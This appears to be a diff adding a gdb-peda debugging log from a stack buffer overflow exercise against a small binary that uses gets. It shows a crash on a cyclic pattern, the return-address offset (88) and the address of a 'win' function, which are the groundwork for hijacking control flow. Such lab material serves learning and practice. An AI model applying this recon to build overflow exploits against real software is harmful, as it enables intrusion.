@@ -1,0 +1,46 @@
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdd90 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
+RBX: 0x0 
+RCX: 0x7ffff7dcda00 --> 0xfbad2288 
+RDX: 0x7ffff7dcf8d0 --> 0x0 
+RSI: 0x405261 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\n")
+RDI: 0x7fffffffdd91 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
+RBP: 0x3541416641414a41 ('AJAAfAA5')
+RSP: 0x7fffffffdde8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
+RIP: 0x401160 (<main+27>:	ret)
+R8 : 0x4052e1 --> 0x0 
+R9 : 0x7ffff7fd54c0 (0x00007ffff7fd54c0)
+R10: 0x405010 --> 0x0 
+R11: 0x246 
+R12: 0x401050 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdec0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401159 <main+20>:	call   0x401040 <gets@plt>
+   0x40115e <main+25>:	nop
+   0x40115f <main+26>:	leave  
+=> 0x401160 <main+27>:	ret    
+   0x401161:	nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x40116b:	nop    DWORD PTR [rax+rax*1+0x0]
+   0x401170 <__libc_csu_init>:	push   r15
+   0x401172 <__libc_csu_init+2>:	mov    r15,rdx
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdde8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
+0008| 0x7fffffffddf0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
+0016| 0x7fffffffddf8 ("A7AAMAAiAA8AANAAjAA9AAOA")
+0024| 0x7fffffffde00 ("AA8AANAAjAA9AAOA")
+0032| 0x7fffffffde08 ("jAA9AAOA")
+0040| 0x7fffffffde10 --> 0x0 
+0048| 0x7fffffffde18 --> 0x3e936b3217086d46 
+0056| 0x7fffffffde20 --> 0x401050 (<_start>:	xor    ebp,ebp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401160 in main ()
+gdb-peda$ patto AAKA
+AAKA found at offset: 88
+gdb-peda$ p win
+$1 = {<text variable, no debug info>} 0x401132 <win>
+gdb-peda$ 
